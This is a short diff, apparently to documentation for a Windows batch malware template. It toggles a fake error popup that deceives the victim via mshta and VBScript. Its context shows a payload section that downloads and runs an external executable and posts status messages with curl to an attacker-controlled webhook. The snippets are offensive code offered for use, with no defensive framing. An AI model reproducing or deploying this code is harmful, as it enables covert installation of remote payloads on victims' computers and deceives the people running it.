@@ -122,10 +122,13 @@ Fake error message
 set "vpath="
 ...
 
+:: FAKE ERROR MESSAGE | REMOVE GOTO IF YOU WANT IT TO DISPLAY
+:: ----------------------------------------------------------
+goto skipfakeerror
 if not "%~dp0"=="%vpath%\" (
 start /min /b mshta vbscript:Execute("Msgbox(""Bodytext""+vbCrLf+vbCrLf+""Anotherbody""),16,""Titletext"":window.close")
 )
-
+:skipfakeerror
 ...
 ```
 
@@ -138,7 +141,7 @@ cd %vpath%
 ...
 
 :: PAYLOAD - REMOVE GOTO IF YOU WANT THE SCRIPT TO DOWNLOAD AND RUN A FILE SOMEWHERE
-:: ----------------------------------------------------------------------------------
+:: ---------------------------------------------------------------------------------
 goto skipcustomdownload
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Downloading and starting a custom file from\n%customdownloadurl% to %vpath%\%customfilename%```\"}" %webhook%
 	set "customdownloadurl=https://external.ext/file.exe"
